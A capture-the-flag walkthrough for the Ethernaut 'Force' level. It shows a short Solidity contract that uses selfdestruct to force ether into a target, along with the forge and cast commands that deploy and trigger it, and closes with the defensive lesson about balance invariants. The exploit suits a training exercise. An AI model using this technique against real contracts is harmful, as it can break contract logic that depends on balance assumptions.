## Force Level Outline

**Difficulty : 5/10**

Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea)

## Solution
We can call the selfdestruct function (which takes an address as a parameter) to force send all remaining ether in this contract to the level address.

### Walkthrough

##### 1. Create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Contract {
    address payable target;

    constructor(address payable _target) {
        target = _target;
    }

    function explode() public payable {
        selfdestruct(target);
    }
}
```

##### 2. Deploy our new contract
```console
forge create src/Contract.sol:Contract --constructor-args $LEVEL_ADDRESS --private-key  $PRIVATE_KEY
```

##### 3. Call our newly deployed contract 
```console
cast send $DEPLOYED_ADDRESS "explode()" --value 0.0001ether --private-key=$PRIVATE_KEY 
```
> Replace $DEPLOYED_ADDRESS with the address of your deployed contract

## Further Reading
As seen from above, it is important not to count on the invariant `address(this).balance == 0` for any contract logic.

### [:arrow_left: Back To Main Menu](../)
